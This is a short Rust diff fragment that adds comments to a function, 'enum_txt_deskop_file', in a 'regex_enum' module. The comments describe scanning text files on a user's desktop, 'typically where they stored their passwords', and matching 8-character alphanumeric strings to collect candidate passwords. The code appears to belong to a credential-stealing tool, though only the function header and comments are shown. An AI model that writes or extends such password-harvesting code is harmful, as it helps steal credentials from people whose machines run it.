@@ -5,6 +5,8 @@ pub mod regex_enum {
     use regex::Regex;
     use lazy_static::lazy_static;
     
+    // Looking on txt files on the user desktop (typically where they stored their passwords)
+    // A regex is used (8 characters with DIGIT and ALPHA) to try getting a password
     pub fn enum_txt_deskop_file(file: String, passwords: &mut Vec<String>)
     {
         // Using lazy_static to ensure that regular expressions are compiled exactly once
